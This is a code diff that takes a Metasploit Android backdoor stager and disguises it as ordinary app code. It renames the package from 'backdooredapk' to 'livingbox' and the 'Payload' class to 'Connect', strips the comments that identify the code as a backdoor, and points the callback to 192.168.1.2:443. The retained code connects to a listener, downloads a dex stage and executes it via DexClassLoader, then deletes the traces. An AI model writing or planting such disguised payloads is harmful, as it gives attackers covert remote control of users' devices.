@@ -1,7 +1,6 @@
-package stage.metasploit.com.backdooredapk;
+package livingbox;
 
 import android.content.Context;
-import dalvik.system.DexClassLoader;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -14,28 +13,24 @@ import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.concurrent.TimeUnit;
+import dalvik.system.DexClassLoader;
 
-public class Payload {
+public class Connect {
     public static final String CERT_HASH = "WWWW                                        ";
     public static final String TIMEOUTS = "TTTT604800-300-3600-10                         ";
-
-    //USAGE NOTE: this backdoor works in a LAN, with Metasploit listening to port 4444, the machine has ip 192.168.178.30
-    //if you wish to modify ip:port (e.g. for a WAN usage, or a different Metasploit machine with different IP)
-    // you can modify the following variable (URL), please DO NOT remove the four 'Z' at the beginning
-    public static final String URL = "ZZZZtcp://192.168.178.30:4444                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
+    public static final String URL = "ZZZZtcp://192.168.1.2:443                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
     public static long comm_timeout;
     private static String[] parameters;
     public static long retry_total;
     public static long retry_wait;
     public static long session_expiry;
 
-    /* renamed from: com.metasploit.stage.Payload.1 */
     static class C00001 extends Thread {
         C00001() {
         }
 
         public void run() {
-            Payload.main(null);
+            Connect.main(null);
         }
     }
 
@@ -95,7 +90,7 @@ public class Payload {
         InputStream inStream;
         if (url.startsWith("https")) {
             URLConnection uc = new URL(url).openConnection();
-            Class.forName("com.metasploit.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+            Class.forName("livingbox.SecureConnection").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
             inStream = uc.getInputStream();
         } else {
             inStream = new URL(url).openStream();
@@ -138,7 +133,7 @@ public class Payload {
         fop.write(core);
         fop.flush();
         fop.close();
-        Class<?> myClass = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader()).loadClass(classFile);
+        Class<?> myClass = new DexClassLoader(filePath, path, path, Connect.class.getClassLoader()).loadClass(classFile);
         Object stage = myClass.newInstance();
         file.delete();
         new File(dexPath).delete();
